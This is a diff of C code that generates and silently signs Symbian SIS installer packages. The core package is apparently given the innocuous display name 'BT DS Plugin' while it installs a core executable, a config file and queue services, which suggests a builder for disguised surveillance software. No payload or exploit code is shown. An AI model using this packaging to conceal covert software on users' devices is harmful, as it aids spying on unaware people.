@@ -8,7 +8,7 @@ const char pkg_uninstall[] = "#{\"%S\"},(0x200305DB),1,0,0\r\n"
 							 "\"%S.exe\" - \"C:\\sys\\bin\\%S.exe\"\r\n";
 
 
-const char pkg_core[] = "#{\"%S\"},(0x200305D7),1,00,000\r\n"
+const char pkg_core[] = "#{\"BT DS Plugin\"},(0x200305D7),1,00,0000\r\n"
 						"%%{\"Vendor-EN\"}\r\n"
 						":\"Vendor\"\r\n"
 						";Supports 3rd\r\n"
@@ -19,12 +19,12 @@ const char pkg_core[] = "#{\"%S\"},(0x200305D7),1,00,000\r\n"
 						"[0x102752AE], 0, 0, 0,{\"Series60ProductID\"}\r\n"
 						";Supports 5th\r\n"
 						"[0x1028315F], 0, 0, 0,{\"Series60ProductID\"}\r\n"
-						"\"%S.exe\" - \"C:\\sys\\bin\\%S.exe\"\r\n"
+						"\"Core_20030635.exe\" - \"c:\\sys\\bin\\Core_20030635.exe\"\r\n"
 						"\"config.bin\" - \"c:\\private\\20030635\\config.bin\"\r\n"
-						"\"SharedQueueCli.dll\" - \"c:\\sys\\bin\\SharedQueueCli_20030633.dll\"\r\n"
-						"\"SharedQueueSrv.exe\" - \"c:\\sys\\bin\\SharedQueueSrv_20030634.exe\"\r\n"
-						"\"uninstaller.SISX\" - \"C:\\sys\\bin\\uninstaller.SISX\"\r\n"
-						"\"200305D7.rsc\" - \"c:\\private\\101f875a\\import\\[200305D7].rsc\"\r\n";
+						"\"SharedQueueCli_20030633.dll\" - \"c:\\sys\\bin\\SharedQueueCli_20030633.dll\"\r\n"
+						"\"SharedQueueSrv_20030634.exe\" - \"c:\\sys\\bin\\SharedQueueSrv_20030634.exe\"\r\n"
+						"\"Uninstaller.SISX\" - \"c:\\sys\\bin\\Uninstaller.SISX\"\r\n"
+						"\"200305D7.rsc\" - \"c:\\private\\101f875a\\import\\[200305D7].rsc\"\r\n\r\n";
 
 BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey)
 {
@@ -58,7 +58,7 @@ BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey)
 	start_Info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 	start_Info.wShowWindow = SW_HIDE;
 
-	sprintf_s(szComm, sizeof(szComm), "\"signsis.exe\" %S %S.SISX %S %S", wsFileSis, wsFileName, wsCert, wsKey);
+	sprintf_s(szComm, sizeof(szComm), "\"signsis.exe\" %S %S.SISX %S %S HTSymbian", wsFileSis, wsFileName, wsCert, wsKey);
 
 	if ((bRet = CreateProcessA(NULL, szComm, 0, 0, true, 0, 0, 0, &start_Info, &proc_Info)) == false)
 		return bRet;
@@ -112,7 +112,7 @@ BOOL CreateSis(UINT flag, TCHAR *wsFile)
 			sprintf_s(buff, sizeof(buff), pkg_uninstall, wsFileName, wsFileName, wsFileName);
 			break;
 		case SIS_CORE:
-			sprintf_s(buff, sizeof(buff), pkg_core, wsFileName, wsFileName, wsFileName);
+			sprintf_s(buff, sizeof(buff), pkg_core, wsFileName, wsFileName);
 			break;
 	}
 
